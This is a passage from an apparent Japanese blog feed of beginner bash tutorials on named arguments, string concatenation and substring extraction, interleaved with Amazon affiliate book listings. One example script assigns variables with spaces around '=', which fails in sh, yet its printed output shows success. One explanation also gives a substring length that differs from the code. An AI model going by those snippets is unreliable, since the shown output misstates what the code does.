&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１４．名前を使用してコマンドラインから引数を取得する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/shellscript.jpg" alt="Featured image of post 【１４．名前を使用してコマンドラインから引数を取得する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="名前を使用してコマンドラインから引数を取得する">名前を使用してコマンドラインから引数を取得する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>コマンドラインから名前付きの引数を取得：&lt;/b>&lt;/font>&lt;br>
名前付きのコマンドライン引数を読み取る方法を示します。&amp;lsquo;command_line_names.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:command_line_names.sh" data-lang="bash:command_line_names.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span> arg in &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nv">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$arg&lt;/span> &lt;span class="p">|&lt;/span> cut -f1 -d&lt;span class="o">=&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">val&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$arg&lt;/span> &lt;span class="p">|&lt;/span> cut -f2 -d&lt;span class="o">=&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nv">$index&lt;/span> in
X&lt;span class="o">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$val&lt;/span>&lt;span class="p">;;&lt;/span>
Y&lt;span class="o">)&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$val&lt;/span>&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">result&lt;/span>&lt;span class="o">=&lt;/span>x+y&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;X+Y=&lt;/span>&lt;span class="nv">$result&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash command_line_names.sh X=45 Y=30
X+Y=75
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>case文で入力された文字列の大文字と小文字に対応する。&lt;/dd>
&lt;dd>または文字列に対応する場合は以下のソースを見て欲しい。&lt;/dd>
&lt;dd>レベルアップしたソースコードはささいな気遣いから生まれる&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#! /bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> in
&lt;span class="o">[&lt;/span>Yy&lt;span class="o">]&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="s2">&amp;#34;yes&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="c1">#Y、yまたはyesという文字列&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;YES&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;OK&amp;#34;&lt;/span>
&lt;span class="p">;;&lt;/span>
&lt;span class="o">[&lt;/span>Nn&lt;span class="o">]&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="s2">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="c1">#N、nまたはnoという文字列&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;NO&amp;#34;&lt;/span>
&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;undefined&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１５．変数に2つの文字列を組み合わせる】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/shellscript.jpg" alt="Featured image of post 【１５．変数に2つの文字列を組み合わせる】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="変数に2つの文字列を組み合わせる">変数に2つの文字列を組み合わせる&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>文字列変数を組み合わせる：&lt;/b>&lt;/font>&lt;br>
文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string_combine.sh" data-lang="bash:string_combine.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">string1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Apple&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Mac OS&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$string2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$string2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string3&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34; は、とても優れたＯＳです。&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$string3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash string_combine.sh
Apple Mac OS
Apple Mac OS は、とても優れたＯＳです。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。&lt;/dd>
&lt;dd>
&lt;p>変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string_example2.sh" data-lang="bash:string_example2.sh">&lt;span class="cp">#!/bin/sh
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">str1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Shell script&amp;#34;&lt;/span>
&lt;span class="nv">str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">str1&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> is intersting!!&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$str&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash string_example2.sh
$ Shell script is interesting!!
$
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１６．文字列の部分文字列を取得する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/shellscript.jpg" alt="Featured image of post 【１６．文字列の部分文字列を取得する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="文字列の部分文字列を取得する">文字列の部分文字列を取得する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>文字列の部分文字列を取得します。&lt;/b>&lt;/font>&lt;br>
他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:substring_example.sh" data-lang="bash:substring_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Learn Bash from NLP&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">subStr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">Str&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">6&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">4&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$subStr&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash substring_example.sh
Bash
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>基本パターンは以下の通り&lt;/dd>
&lt;dd>${パラメータ:オフセット:長さ}&lt;br>
:&lt;/dd>
&lt;dd>Bashでの文字列の切り出しはかなりの頻度で使います。&lt;/dd>
&lt;dd>知っているのと知らないのとでは、苦労が違ってきます。&lt;/dd>
&lt;dd>具体例を以下にしめします。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:部分文字列抽出" data-lang="bash:部分文字列抽出">#!/bin/bash
HOGE=&amp;quot;abcdef&amp;quot;
# オフセット位置から長さ分を取得
echo ${HOGE:0:2}
# -&amp;gt; ab
echo ${HOGE:2:2}
# -&amp;gt; cd
echo ${HOGE:4:2}
# -&amp;gt; ef
# 長さを省略した場合はオフセットから最後まで出力
echo ${HOGE:2}
# -&amp;gt; cdef
# 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる
echo ${HOGE:0:-2}
# -&amp;gt; abcd
# オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定)
# 指定した変数が空文字列の場合は右に指定した文字が入る
echo ${HOGE:-2}
# -&amp;gt; abcdef
HOGE=
echo ${HOGE:-2}
# -&amp;gt; 2
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash:右端からのパターン一致除外" data-lang="bash:右端からのパターン一致除外">#!/bin/bash
HOGE=hoge.tar.bz2
echo ${HOGE}
